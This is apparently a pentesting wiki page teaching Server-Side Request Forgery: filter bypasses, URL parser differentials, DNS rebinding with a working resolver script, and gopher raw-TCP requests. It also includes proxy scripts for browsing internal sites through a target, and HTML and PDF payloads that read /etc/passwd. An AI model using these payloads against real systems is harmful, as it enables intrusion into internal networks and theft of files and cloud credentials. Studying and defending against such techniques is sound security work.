---
description: >-
  Make servers send requests on your behalf to internal services with URL
  parsing tricks
---

# Server-Side Request Forgery (SSRF)

Server-Side Request Forgery is triggering a server to make _arbitrary_ requests for you. Often through functionality that looks up some resource via a URL or a proxy-like functionality that intentionally lets you craft any request. If the vulnerable server is inside some private network, requests to internal services can be made that an attacker normally isn't able to reach.

Before attacking every URL field you see, you should check whether it is really the **server** making the request or just your own **browser** via `fetch()`. You won't gain anything from your own browser as you're already in that network. But a server may be in other networks.

**Debug** by making it request your own server first, then change the target to what you actually want to reach. requestrepo is a simple tool that gives you a unique subdomain which logs DNS and HTTP/HTTPS requests in full.

{% embed url="https://requestrepo.com/" %}

{% hint style="success" %}
**Tip**: you might see _only DNS logs_ coming in, but this does not mean an HTTP request is not made. Network policies of the application often block outbound networking, and internal targets may still work. Debugging is just a little harder.
{% endhint %}

## Filters

The tricky part about SSRF defenses is that you often want to allow some subset of URLs to still be requested, while **internal hosts** should be disallowed. This implementation is known as the _filter_, and is often a lot more complicated than it looks on the surface. For this you can thank IP/URL formats, DNS, and unexpected HTTP features enabled by default.

With source code access, carefully read how the filter is implemented exactly to see if any of the following techniques apply. Otherwise, probe the filter with varying inputs to rule out certain checks and find bypasses that way.

### IP parsing

A naive way of blocking, say `localhost` access, is to block keywords like "localhost" or "127.0.0.1", because surely those are the only two ways to reference localhost. Unfortunately for those developers, IP addresses are standardized to support many other formats, all explained in [`man inet_pton`](https://man7.org/linux/man-pages/man3/inet_pton.3.html). Any IP address can be encoded like this.

{% code title="Different representations of 127.0.0.1" %}
```
127.1
0x7f.0x0.0x0.0x1
0177.00.01
2130706433
```
{% endcode %}

The `ipobf` tool below implements a bunch of these encoding formats to generate a fuzzing list:

{% embed url="https://github.com/JorianWoltjer/ipobf/tree/master" %}

If you thought this wasn't complex enough, you can encode IPv4 addresses with IPv6 as "IPv4-mapped" addresses for backwards compatibility. These can be decimal or hex like:

{% code title="IPv4-mapped IPv6 address of 127.0.0.1" %}
```
::ffff:127.0.0.1
::ffff:7f00:1
```
{% endcode %}

***

Another fact about specifically _loopback_ addresses (pointing to your locally hosted services) is that the entire `127.0.0.0/8` range is actually considered as loopback. So `127.1.2.3` works just as well, and through all the above formats.

Lastly, on Linux, `0.0.0.0` also points to your loopback. This can break some filters that categorize "private IPs" because this special IP is not always considered private, but rather "multicast".\
For reference about these special types of IPs, you can check Go's implementation of `IsGlobalUnicast()`: [https://go.dev/src/net/ip.go](https://go.dev/src/net/ip.go)

### URL Injection

When you have control over any part of a URL that is fetched by the server, you should ask yourself, can I control the host that this request goes to? When an injection is after the path, you're often out of luck:

{% code title="Impossible to switch host" %}
```
https://example.com/INJECTION
```
{% endcode %}

But where it gets more interesting is if you can do anything _before_ the path:

```
https://example.comINJECTION
```

There are multiple ways to exploit this now:

1. Using `@attacker.tld` as the `INJECTION`, the URL becomes `https://example.com@attacker.tld`. Anything before the `@` is seen as the "credential" part of the URL, while `attacker.tld` now becomes the host.
2. Using `.attacker.tld`, the URL becomes `https://example.com.attacker.tld` which is a registerable subdomain under the attacker.

Even when you're stuck in the path, you can still influence the URL greatly. For example:

```
https://example.com/subdir/INJECTION?safe=true
```

Injecting `../whatever#` here would turn the URL into `https://example.com/subdir/../whatever#?safe=true`, which causes `https://example.com/whatever` to be requested.

**Parameter pollution** is another realistic attack vector, where in the following injection:

```
https://example.com/?safe=true&input=INJECTION
```

We can write `x&safe=false` in hopes that the receiving server sees only the _last_ value of `safe`. For more tricks like this, see [#path-traversal](../client-side/client-side-path-traversal-cspt.md#path-traversal "mention").

### Parser differentials

When preparing to request a URL it is common to parse it and check if it's safe, before initiating the request. It is crucial that the parsers used for the **check** and the **request** are the same though, because if they differ in any way, there is a chance that one URL is parsed in two different ways. While it may look safe to the parser during the check, it can be interpreted another way when it's actually requested.

One specific example is highlighted by SonarSource's article below:

{% embed url="https://www.sonarsource.com/blog/security-implications-of-url-parsing-differentials/" %}

Many libraries disagree on how to parse the following URL:

```
http://a.tld\@b.tld
```

Even inside Python, two different libraries [urllib](https://docs.python.org/3/library/urllib.html) and [urllib3](https://pypi.org/project/urllib3/) parse the hostname as `b.tld` and `a.tld` respectively:

{% code title="Python showcase" %}
```python
import urllib.parse
from urllib3.util import parse_url

url = r'http://a.tld\@b.tld'
print(urllib.parse.urlparse(url).hostname)  # 'b.tld'
print(parse_url(url).hostname)              # 'a.tld'
```
{% endcode %}

Python `requests` uses urllib3. So if it were parsed by urllib, one could hide the real URL and fake a hostname like this:

{% code title="Exploit example" %}
```python
import urllib.parse
import requests

url = r'https://secret.internal\@safe.example/../some-path'
if urllib.parse.urlparse(url).hostname != 'safe.example':
    raise Exception("Disallowed hostname")

requests.get(url)  # Sends request to: https://secret.internal/some-path
```
{% endcode %}

Research by Orange Tsai shows more examples of URL parser quirks potentially exploitable for SSRF: ["A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!"](https://blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

Another differential that's worth highlighting is in **`curl`**. When your input is parsed by practically any parser, and then the cURL command line tool requests it without disabling [globbing](https://everything.curl.dev/cmdline/urls/globbing.html), you can bypass any filter. Look for a missing `-g` flag (libcurl doesn't support globbing, only the CLI is affected). Using `{}` characters you can make cURL request 2 URLs instead of one, where the 2nd is bypassed.

We can do this practically by starting `{` in the credential part of the URL, and then ending `}` somewhere in the hash fragment. A normal URL parser will allow and ignore this. Then cURL recognizes the globbing syntax and splits on the `,` into 2 URLs:

```bash
http://{@safe.example#,secret.internal}
```

PHP parses its host as `safe.example`:

{% code title="PHP parse_url() example" %}
```php
php > var_dump(parse_url('http://{@safe.example#,secret.internal}'));
array(4) {
  ["scheme"]=>
  string(4) "http"
  ["host"]=>
  string(12) "safe.example"
  ["user"]=>
  string(1) "{"
  ["fragment"]=>
  string(17) ",secret.internal}"
}
```
{% endcode %}

But `curl` expands the `{a,b}` syntax into these 2 requests:

```shellscript
$ curl -s -o /dev/null --write-out '%{url}\n' 'http://{@safe.example#,secret.internal}'
http://@safe.example#
http://secret.internal
```

***

If you can't find a working payload online, you can look for differentials yourself through **fuzzing**. All you have to do is programmatically set up the parsers you want to compare, generate random inputs, and compare their outputs. We could rediscover the urllib vs. urllib3 differential this way:

{% code title="Fuzzing example" %}
```python
import string
import itertools
import urllib.parse
from urllib3.util import parse_url
from urllib3.exceptions import LocationParseError

# Try all combinations of 2 of these characters: !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
for chars in itertools.product(string.punctuation, repeat=2):
    url = f"https://a.tld{''.join(chars)}b.tld"
    try:
        hostname1 = urllib.parse.urlparse(url).hostname
        hostname2 = parse_url(url).hostname
    except (ValueError, LocationParseError):
        continue
    # If they differ, log it
    if (hostname1 == "a.tld" and hostname2 == "b.tld") or (hostname1 == "b.tld" and hostname2 == "a.tld"):
        print(f"\nFound differential with {url!r}")  # 'https://a.tld\\@b.tld'
        print(f"urllib:  {hostname1!r}")  # 'b.tld'
        print(f"urllib3: {hostname2!r}")  # 'a.tld'
```
{% endcode %}

### Redirects

A simple but effective way of bypassing a URL filter is sending it to an attacker-controlled allowed host first, but then _redirecting_ it to another URL in the `Location:` response header. If the requester follows redirects and does not re-check the new URL, the 2nd time may bypass any checks.

Many libraries implicitly follow redirects unless you opt out. And even then it's awkward to have to read the `Location:` header yourself and check the new URL again.\
Below is a simple PHP server that returns a [302 redirect](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/302) (shouldn't be cached as opposed to [301](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/301)):

```php
<?php
header("Location: http://localhost", true, 302)
```

{% hint style="success" %}
**Tip**: You can also use [requestrepo](https://requestrepo.com/) for this by editing the _Response_. Update the status code to 302 and add a `Location` header set to `http://localhost`, then press _Save_.
{% endhint %}

Through a server-side redirect, paths and URL parameters aren't preserved so you'll have to add these like `http://localhost/path?key=value` in the `Location:` header, but that also means you fully control them!

The method is forced to be GET, only if the original request was a POST request, you can set the status code to [307](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/307) in order to **preserve the method and body** (`POST`). This means you can even send POST requests anywhere, you just don't have control over the body as it will be kept from the original request.

### DNS Rebinding

As you know, we don't just use IP addresses on the web. Domain names are much more common. But if you're implementing a filter that differentiates internal from external IP addresses, how would you do that for domain names?\
One approach often taken is to first resolve the domain to an IP address, then check that IP address just like in [#ip-parsing](server-side-request-forgery-ssrf.md#ip-parsing "mention") (but now normalized by DNS). The **problem** here is that DNS entries can _change_. In this approach, we can change the IP address our domain resolves to right after it was checked to be safe. The request will resolve the domain once more and now get back the edited value (eg. `127.0.0.1`). This is known as "DNS Rebinding" or more generally a ["TOCTOU"](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use) vulnerability.

To set this up, you need a few things:

1. A VPS that can listen on UDP port 53 with a _public IP_ (eg. `1.3.3.7`). This is the "DNS Server"
2. An `A` record pointing to the IP of your DNS server (eg. `ns1.hacker.tld -> 1.3.3.7`)
3. An `NS` record pointing to the `A` record (eg. `rebind.hacker.tld -> ns1.hacker.tld`)&#x20;

When this is set up, you can run a DNS server on the VPS like this:

<pre class="language-python"><code class="lang-python">import dnslib.server
import dnslib
import random

class DNSResolver:
    def resolve(self, request, handler):
        print(request)
        reply = request.reply()
        name = str(request.q.qname)[:-1].lower()
<strong>        ip = random.choice(["1.1.1.1", "127.0.0.1"])
</strong>        print(name, "->", ip)
        reply.add_answer(dnslib.RR(name, dnslib.QTYPE.A, rdata=dnslib.A(ip), ttl=0))
        return reply

resolver = DNSResolver()
logger = dnslib.server.DNSLogger("-request,-reply")  # Disable default logger
server = dnslib.server.DNSServer(resolver, port=53, address="", logger=logger)
server.start()
</code></pre>

Requesting any domain name under the `NS` record (eg. `test.rebind.hacker.tld`) now gets resolved by your Python server.

#### Using online tools

Luckily existing tools such as ["Singularity of Origin"](https://github.com/nccgroup/singularity) have implemented this already with a smart subdomain-based configuration that anyone can use. The format is explained here:

{% embed url="https://github.com/nccgroup/singularity/wiki/How-to-Create-Manual-DNS-Requests-to-Singularity%3F" %}

Basically, if you want to use the "First then always second" method you should choose the `fs` strategy and use the following Python script to format your IPs. Here I set the _first_ to `1.1.1.1`, and the _second_ to `127.0.0.1`.

```python
from secrets import token_hex

def encode(ip):
    return ''.join(f"{int(n):02x}" for n in ip.split("."))

print(f"s-{encode("1.1.1.1")}.{encode("127.0.0.1")}-{token_hex(6)}-fs-e.d.rebind.it")
```

Resolving this domain name now indeed gives `1.1.1.1` first (check), then always `127.0.0.1` (use):

<pre class="language-shellscript"><code class="lang-shellscript">$ dig +noall +answer s-01010101.7f000001-730f3fc2ce38-fs-e.d.rebind.it
<strong>s-01010101.7f000001-730f3fc2ce38-fs-e.d.rebind.it. 5 IN A 1.1.1.1
</strong>$ dig +noall +answer s-01010101.7f000001-730f3fc2ce38-fs-e.d.rebind.it
<strong>s-01010101.7f000001-730f3fc2ce38-fs-e.d.rebind.it. 3 IN A 127.0.0.1
</strong>$ dig +noall +answer s-01010101.7f000001-730f3fc2ce38-fs-e.d.rebind.it
<strong>s-01010101.7f000001-730f3fc2ce38-fs-e.d.rebind.it. 2 IN A 127.0.0.1
</strong></code></pre>

{% hint style="success" %}
**Tip**: It may sometimes be smarter to use the `rd` (random) strategy and spam it until it works. Some systems have multiple checks where the first, second and third must be `1.1.1.1`, for example. With random you can just get lucky that the resolutions happen to line up how you need them.
{% endhint %}

***

DNS can have **multiple entries** for one name. Each one must be checked, otherwise a library sending the request might fall back to another entry if the first one fails. You can try this in Python `dnslib` by just adding more `reply.add_answer()` calls before returning.

Some routers deny DNS replies containing loopback addresses like `127.0.0.1` to block these exact attacks. In the ["Protection Bypasses"](https://github.com/nccgroup/singularity/wiki/Protection-Bypasses) section a few more variations are explained, like using `0.0.0.0` on a Linux-based target and returning `CNAME` records instead which are essentially aliases to other names that the requester will have to request again. Setting the value to `localhost` may make the resolver internally return `127.0.0.1`. If you know any records exist in the internal network of the target (eg. `server.target.tld`) you can set the CNAME to this, which will get its `A` record.

{% hint style="danger" %}
**Note**: All these DNS attacks assume the `Host:` header isn't validated by the receiving server. Because it will be on the attacker's domain still, we only change the IP. HTTPS will also break with this, so you have to hope this is not verified either. Though it is common for internal services to be run over HTTP.
{% endhint %}

## Impact

Possibly the hardest part of an SSRF vulnerability is figuring out what you can do with it. In a blackbox scenario, this is a bunch of guesswork and having knowledge of your target's internal infrastructure. Though this is not a prerequisite, as you can also _learn_ a lot about the target by playing with the SSRF primitive.

By requesting random internal services you may come across well-known applications that weren't made to be publicly accessible. Such apps can intentionally disclose sensitive information or provide dangerous actions, or even be outdated and contain n-day vulnerabilities you may be able to exploit _through_ an SSRF.

Exactly what you can do with your SSRF depends on how it works technically.

* Does it expect a certain format in the response?
  * -> Decides if it is [#full-read-ssrf](server-side-request-forgery-ssrf.md#full-read-ssrf "mention") or [#blind-ssrf](server-side-request-forgery-ssrf.md#blind-ssrf "mention")
* Does it give detailed errors on failed connections?
  * -> Decides if you can find IP addresses before ports
* How fast is a single attempt?
  * -> Decides how large of a range you can fuzz

{% hint style="info" %}
**Tip**: If you have the luxury of being able to read `/etc/hosts`, it may contain other hardcoded internal hosts (docker compose will even fill this file automatically).\
`/proc/net/tcp` also contains hex-encoded versions of all inbound and outbound TCP connections which may leak who the server is communicating with to discover new hosts.
{% endhint %}

### Targets

With SSRFs you want to generally **cross network boundaries**. By requesting `localhost` or other internal IPs in `10.0.0.0/8`, `172.16.0.0/12` or `192.168.0.0/16`.&#x20;

[`prips`](https://manpages.ubuntu.com/manpages/focal/man1/prips.1.html) is a useful small tool that takes a subnet/range and prints out all IP addresses within. It makes creating fuzzing lists easy:

<pre class="language-shellscript"><code class="lang-shellscript"><strong>$ prips 192.168.0.0/24
</strong>192.168.0.0
192.168.0.1
192.168.0.2
...
192.168.0.255
</code></pre>

You can also access **firewalled** hosts that have rules to only allow connections from internal IPs. With SSRF, you've become such an internal host and can potentially request **subdomains** that don't seem to respond from the outside.

**Cloud** environments often have special **metadata IPs** that return information about the current machine. The most well-known is AWS at `http://169.254.169.254`. Other platforms have more security measures where some extra request headers are required, assuming that you cannot control these request headers. Check out all the details in the page below:

{% embed url="https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#gcp" %}
List of Cloud SSRF techniques for all platforms
{% endembed %}

Lastly, if your SSRF is working as effectively a proxy, you can intentionally send a request to _your own_ server and control the response headers. Some reverse proxies handle certain response headers in a special way, see [#special-response-headers](reverse-proxies.md#special-response-headers "mention") for details.

#### Docker

When your application is running inside [Docker](https://www.docker.com/), there may be more containers running on the same machine. By default containers get an incremental IP in the `172.17.0.0/16` subnet but if a docker `network` is created, that subnet number (`17`) can increase. Containers start at `.2` and increment from there.

{% code title="All Docker subnets in order" %}
```
172.17.0.0/16
172.18.0.0/16
172.19.0.0/16
172.20.0.0/16
172.21.0.0/16
172.22.0.0/16
172.23.0.0/16
172.24.0.0/16
172.25.0.0/16
172.26.0.0/16
172.27.0.0/16
172.28.0.0/16
172.29.0.0/16
172.30.0.0/16
192.168.0.0/16
```
{% endcode %}

In some desktop environments you can reach the host via the special `host.docker.internal` domain name. However, in most instances you need to manually find the default gateway. This will always be the `.1` host on the subnet the container has (eg. `172.17.0.0/16` -> `172.17.0.1`).

{% code title="Possible host mappings in Docker" overflow="wrap" %}
```
172.17.0.1 172.18.0.1 172.19.0.1 172.20.0.1 172.21.0.1 172.22.0.1 172.23.0.1 172.24.0.1 172.25.0.1 172.26.0.1 172.27.0.1 172.28.0.1 172.29.0.1 172.30.0.1 192.168.0.1
```
{% endcode %}

#### Ports

After finding an IP, you can try to find HTTP/HTTPS services on it by scanning ports. Depending on how fast you can fuzz, you should decide if you want to test only a few ports or many ports. In [common-http-ports.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Infrastructure/common-http-ports.txt) there are the top 36 most widely used ports where you can find HTTP, with of course `80` being by far the most common.

For internal services, however, you'll often also find `8080`, `8000`, `5000`, `3000` etc. to avoid clashing with other in-use ports. So especially on localhost, scanning a broader range is important.

### Method, Path, Query & Headers

The more fields of the request you control in an SSRF, the more possibilities open up. In [#url-injection](server-side-request-forgery-ssrf.md#url-injection "mention") there are some ideas for when you only control the Path or URL. But when you have an input where you also decide the method or a header, for example, it can become more interesting.

Surprisingly often _request_ libraries don't properly sanitize their inputs. This means you may be able to inject special characters like `\r\n` (`%0d%0a`) into the request Method, Path or Header value to add extra headers or a body to a request. This may be required for modern Cloud metadata endpoints as mentioned in [#targets](server-side-request-forgery-ssrf.md#targets "mention"). Read [crlf-header-injection.md](../client-side/crlf-header-injection.md "mention") for more details about this attack.

### Protocols

When inputting a URL to fetch, you're not always forced to use `http:` or `https:`. With different protocols you can trigger different behavior. Fetching a `file://` URL for example, you may be able to read local files ([local-file-disclosure.md](local-file-disclosure.md "mention")).

#### SMB

On Windows, **SMB** also provides some interesting functionality. Firstly, on `127.0.0.1` you can always access your current machine's filesystem. Drives are mapped as shares with a `$` suffix, so the following path will read `C:\Windows\win.ini` when requested (`//` starting syntax signifies SMB, you can also try `smb://`):

{% code title="Windows SMB file read" %}
```
\\127.0.0.1\C$\Windows\win.ini
```
{% endcode %}

When the network policies allow it, making an SMB connection to an _external server_ can leak the password **hash** of the account initiating it because Windows automatically sends it. Tools like [Responder](https://github.com/lgandx/Responder) can capture these hashes. Then either **relay** it if you are already inside the internal network or try to **crack** it ([#forcing-authentication-to-relay](../../windows/exploitation.md#forcing-authentication-to-relay "mention")).

#### Gopher

An old protocol called [Gopher](https://en.wikipedia.org/wiki/Gopher_\(protocol\)) is still supported by most notably `curl` through `gopher://`. What it allows attackers to do today is send **raw TCP packets** and get back **raw TCP responses**. You specify a host like normal, then prefix the path with `_` and the rest of the path becomes a URL-encoded packet you wish to send. This [CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(true\)Find_/_Replace\(%7B'option':'Regex','string':'.*'%7D,'gopher://example.com:80/_$%26',false,false,false,true\)\&input=R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGV4YW1wbGUuY29tDQo\&ieol=CRLF\&oeol=CRLF) can be used to encode a packet.

{% code title="Packet" overflow="wrap" %}
```http
GET / HTTP/1.1
Host: example.com

```
{% endcode %}

{% code title="Sending through gopher" overflow="wrap" %}
```shellscript
$ curl 'gopher://example.com:80/_GET%20%2F%20HTTP%2F1%2E1%0D%0AHost%3A%20example%2Ecom%0D%0A'
HTTP/1.1 200 OK
Content-Type: text/html
Transfer-Encoding: chunked
...

22f
<!doctype html><html lang="en"><head><title>Example Domain</title>...</html>

0
```
{% endcode %}

{% hint style="info" %}
**Note**: You need to specify the port even if it is `:80`, as gopher defaults to 70 instead of 80.
{% endhint %}

Any service accepting TCP can be interacted with. The only limitation is that you cannot keep a TCP conversation going. Only your one packet is sent, a response is received, then the connection immediately closes. Below is a collection of known gadgets that can be exploited with a single packet when found in the internal network:

{% embed url="https://github.com/tarunkant/Gopherus" %}

#### Protocol confusion (mixing)

Another idea is sending HTTP, but to a different port that doesn't necessarily speak HTTP. Protocols that are similarly newline-delimited (such as SMTP) can have commands be injected through header names or the request body. It is worth assessing what protocols are running and whether or not you can craft a valid packet for them with your SSRF request format.

One famous example is [Redis](https://redis.io/) which is a fast key-value store with a simple newline-delimited command protocol. Read [#ssrf](../../networking/redis-valkey-tcp-6379.md#ssrf "mention") for a detailed explanation on how it can be exploited.\
This has now mostly been fixed by [adding a protection](https://github.com/redis/redis/blob/a8edcfc98c50bb01c850e5dab3998ce57807144d/src/server.c#L4515-L4516) looking for `POST` or `Host:` commands as heuristics of this attack, and closing the connection when either is encountered.

### Full-Read SSRF

The most powerful form of SSRF is when you can _read the response_. Most often this will be the body, maybe in an error or just as a proxy functionality. Anyhow, through your fuzzing you should find servers and try to recognize what software they are running.

You can then browse the website by manually requesting URLs, reading `href=`'s and requesting more. Or, write a simple proxy that you can connect to your browser to fully _browse_ an internal website. You can take the following two [mitmproxy](https://www.mitmproxy.org/) scripts as reference, implement your own SSRF here:

{% code title="proxy_url.py" overflow="wrap" %}
```python
import mimetypes
import requests
from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    r = requests.post("http://target.tld/ssrf",
                      json={"url": flow.request.pretty_url})
    data = r.json()

    content_type, _ = mimetypes.guess_type(flow.request.pretty_url)
    if content_type is None: content_type = "text/html"

    flow.response = http.Response.make(
        status_code=r.status_code,
        content=data["body"],
        headers={"Content-Type": content_type},
    )
```
{% endcode %}

{% code title="proxy_full.py" overflow="wrap" %}
```python
import requests
from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    payload = {
        "url": flow.request.pretty_url,
        "method": flow.request.method,
        "headers": dict(flow.request.headers),
        "body": flow.request.get_text(),
    }
    r = requests.post("http://target.tld/ssrf", json=payload)
    data = r.json()

    flow.response = http.Response.make(
        status_code=data["status"],
        content=data["body"],
        headers=data["headers"],
    )
```
{% endcode %}

Run either of these scripts with `mitmproxy` and a port for the proxy to listen on:

{% code overflow="wrap" %}
```bash
mitmproxy -s proxy.py -p 8081
```
{% endcode %}

Then configure your tools or browser to use `http://127.0.0.1:8081` as the proxy. In Burp Suite you do this via the _Network_ -> _Connections_ -> _Upstream proxy servers_ configuration.

<figure><img src="../../.gitbook/assets/image (82).png" alt="" width="356"><figcaption><p>Burp Suite "Upstream proxy servers" setting to mitmproxy</p></figcaption></figure>

### Blind SSRF

If your request only gets _sent_ and the user never sees a response, it is considered "blind". This may also be the case if it requires such an esoteric response format that you're effectively never able to read any response from an unintended host.

{% hint style="success" %}
**Tip**: If your response needs to be an image, you can try requesting `/favicon.ico` or `/favicon.png` for various hosts to find not only if they work, but also what software it is by their favicon. You can then reverse image search or even [look for the hash on shodan](https://blog.shodan.io/deep-dive-http-favicon/).
{% endhint %}

You can still find which IPs or ports work via error messages or timing in most cases. Try working versus non-working hosts, and know that when you see "No route to host" it means the IP could not be reached, so you don't need to waste time port scanning such a host.

{% embed url="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/" %}

### Automated Browsers

One last variant of SSRF is when it involves an automated headless browser. Because these make requests by design, SSRF is a natural idea. If a browser renders your HTML, many features can cause requests to be triggered, though all of these must be [_Simple Requests_](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS#simple_requests). The following repository collects all ways HTML can make blind requests:

{% embed url="https://github.com/cure53/HTTPLeaks" %}

{% hint style="warning" %}
**Warning**: These techniques use a lot of HTML, and some renderers require **strictly correct HTML**, no formatting errors such as missing `"` or missing `</` closing tags. Ensure it follows the [HTML spec](https://html.spec.whatwg.org/multipage/parsing.html) without triggering any "Parse errors" the browser usually fixes for you.
{% endhint %}

#### PDF/Screenshot

A very powerful primitive is when you get back a PDF or screenshot of the page that the browser was on. This gives you a way to **exfiltrate** data. CORS blocks things like `fetch()` but **visually** a browser can often still display cross-origin data, it may just not be programmatically accessible.

Most of the techniques above are _blind_, but one stands out: `<iframe>`. This can render an external website inside another website. If the application takes a screenshot of some HTML-injected page, adding the following would render http://localhost:8000.

{% code overflow="wrap" %}
```html
<iframe src="http://localhost:8000" width="1000" height="1000"></iframe>
```
{% endcode %}

{% hint style="info" %}
**Tip**: To _scroll_ the iframe, use CSS via a `style=` attribute and shift the `height=` with a negative `top:`:

{% code overflow="wrap" %}
```html
<iframe src="https://nl.wikipedia.org/wiki/Hoofdpagina" width="1000" height="1000" style="position: absolute; top: -0px;left: 0"></iframe>
<iframe src="https://nl.wikipedia.org/wiki/Hoofdpagina" width="1000" height="2000" style="position: absolute; top: -1000px;left: 0"></iframe>
<iframe src="https://nl.wikipedia.org/wiki/Hoofdpagina" width="1000" height="3000" style="position: absolute; top: -2000px;left: 0"></iframe>
```
{% endcode %}
{% endhint %}

Temporary bits of HTML are often rendered through the `file://` protocol. What's special about this is that from a file protocol, you can iframe other files without restrictions (just can't read them by default):

{% code overflow="wrap" %}
```html
<iframe src=file:///etc/passwd></iframe>
<iframe src=file://C:\Windows\win.ini></iframe>
```
{% endcode %}

By pointing it to a directory, you even get a nicely rendered list of files and directories in there, so you don't have to fuzz file paths:

{% code overflow="wrap" %}
```html
<iframe src=file:///></iframe>
<iframe src=file://C:\></iframe>
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (83).png" alt="" width="469"><figcaption><p>Example file listing on Linux in the browser</p></figcaption></figure>

If iframes are denied for any reason, you can also try **navigating** the browser. Even with just HTML you can achieve this through the [`<meta>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/http-equiv#refresh) tag:

{% code overflow="wrap" %}
```html
<meta http-equiv="refresh" content="0;http://localhost:8000">
```
{% endcode %}

If a screenshot is made too quick (eg. before loading some resource/navigation), you can try slowing down the load by a slow image. This will hold `waitUntil: "networkidle2"` calls too:

{% code overflow="wrap" %}
```html
<img src="https://r.jtw.sh?delay=10000">
```
{% endcode %}

For PDFs specifically, there are features that intentionally attach files via HTML to the resulting file as **attachments**. Try including the following three HTML tags, which work for **mPDF < 7.0**, **WeasyPrint**, and **PD4ML**, respectively:

{% code overflow="wrap" %}
```html
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
<link rel=attachment href="file:///etc/passwd">
<pd4ml:attachment src="/etc/passwd" description="attachment sample" icon="Paperclip" />
```
{% endcode %}

After getting the PDF, look for attached files with `pdfdetach`:

<pre class="language-bash" data-title="Extracting attachments from PDF" data-overflow="wrap"><code class="lang-bash"><strong>$ pdfdetach -list output.pdf
</strong>1 embedded files
1: passwd
<strong>$ pdfdetach -saveall output.pdf
</strong><strong>$ cat passwd
</strong>root:x:0:0:root:/root:/bin/bash
...
</code></pre>

For later versions of mPDF, one technique exists to [SSRF with Gopher](https://medium.com/@brun0ne/breaking-mpdf-with-regex-and-logic-bf915300483f) and another using PHP phar deserialization:

{% embed url="https://medium.com/@brun0ne/rce-via-a-malicious-svg-in-mpdf-216e613b250b" %}

You may find n-days or 0-days in other libraries by looking at the `Creator` & `Producer` EXIF data. Libraries often leave their mark here with version numbers to search online:

<pre class="language-shellscript" data-title="Get metadata from PDF" data-overflow="wrap"><code class="lang-shellscript"><strong>$ exiftool output.pdf 
</strong>...
Creator                         : wkhtmltopdf 0.12.5
Producer                        : Qt 4.8.7
</code></pre>

#### Server-Side XSS

In browsers we're often not limited to just HTML, but also JavaScript. In [cross-site-scripting-xss](../client-side/cross-site-scripting-xss/ "mention") you can learn all sorts of ways to potentially execute arbitrary JavaScript with which you can access anything you would be able to in a normal XSS attack.

It is smart to enumerate some information about where your JavaScript is being executed. By reading `location.href` and `navigator.userAgent` you can quickly learn how the HTML is rendered and what software the browser is based on. Try `fetch()`'ing around with relative URLs to see if you can access anything interesting.

Some configuration is often different from regular browsers and may allow for more exploitation vectors. **CLI flags** become very important. Developers sometimes set these to fix bugs without realizing the implications.

Check if **CORS** is enforced. Because the `--disable-web-security` flag would disable such check and allow any website to request any other website's data:

{% code overflow="wrap" %}
```javascript
fetch("http://localhost:8000").then(r => r.text()).then(t => document.body.innerText = t)
```
{% endcode %}

If you find yourself on a `file://` location, also try fetch other relative files. Some browsers will see them all as same-origin, while regular browsers should see each file as a separate origin.

{% hint style="warning" %}
**Tip**: some headless browser libraries don't use the standard JavaScript engine, and instead expose only a subset of functions. [`document.write()`](https://developer.mozilla.org/en-US/docs/Web/API/Document/write) is a relatively reliable way to put text inside the document:

{% code overflow="wrap" %}
```html
<script>document.write(7*7)</script>
```
{% endcode %}

Instead of the modern `fetch()`, you may have to fall back to [`XMLHttpRequest`](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) as well:

{% code overflow="wrap" %}
```html
<script>
	req = new XMLHttpRequest();
	req.onload = function () { document.write(this.responseText) }
	req.onerror = function () { document.write('failed') }
	req.open("GET", "file:///etc/passwd");
	req.send();
</script>
```
{% endcode %}
{% endhint %}

You can attack the underlying system with techniques described in [headless-browsers.md](../client-side/headless-browsers.md "mention"). The most common problem is using **outdated versions** that have known memory corruption/sandbox escape vulnerabilities. The best part is that commonly, you can skip the sandbox stage because `--no-sandbox` is set. Some containers that have no `CAP_SYS_ADMIN` capability or run as `root` don't support the sandbox, so require this flag to be set.\
Note that sometimes CLI flags can disable certain features exploits rely on, like WebAssembly or JIT.
